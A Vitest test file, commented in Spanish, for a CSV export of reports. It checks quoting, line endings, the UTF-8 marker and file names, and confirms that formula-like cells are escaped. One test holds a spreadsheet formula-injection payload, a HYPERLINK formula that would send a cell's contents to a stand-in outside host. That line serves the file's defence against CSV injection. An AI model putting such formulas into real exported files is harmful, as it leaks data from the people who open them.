/** «Descargar» de Reportes (ADR 0071): el CSV sigue RFC 4180 y Excel lee bien los acentos. */
import { describe, expect, it } from "vitest"
import { csvFileName, toCsv } from "./report-csv.js"

describe("CSV", () => {
  it("lleva la marca UTF-8, separa con comas, termina cada fila en CRLF y cita lo que hace falta", () => {
    const body = toCsv(["Persona", "Detalle", "Importe"], [
      ["Peña, José", 'Dijo "mañana"', "520.00"],
      ["Ana", "Dos\nlíneas", null],
      ["Luis", true, 0],
    ])
    expect(body.startsWith("\uFEFF")).toBe(true)
    expect(body.slice(1)).toBe('Persona,Detalle,Importe\r\n"Peña, José","Dijo ""mañana""",520.00\r\nAna,"Dos\nlíneas",\r\nLuis,Sí,0\r\n')
  })

  it("un texto que Excel leería como fórmula va con apóstrofo; un número negativo no", () => {
    const body = toCsv(["Persona", "Importe"], [['=HYPERLINK("https://x/?"&C2;"ver")', "-520.00"], ["+51 999", -3], ["@x", "Ana"]])
    expect(body.slice(1).split("\r\n").slice(1, 4)).toEqual([`"'=HYPERLINK(""https://x/?""&C2;""ver"")",-520.00`, "'+51 999,-3", "'@x,Ana"])
  })

  it("el nombre del archivo, sin tildes ni signos, con su periodo", () => {
    expect(csvFileName("Deuda de más de 30 días", "2026-09")).toBe("deuda-de-mas-de-30-dias-2026-09.csv")
    expect(csvFileName("No vinieron, por profesional", "2026-09-10..2026-09-25")).toBe("no-vinieron-por-profesional-2026-09-10-a-2026-09-25.csv")
  })
})
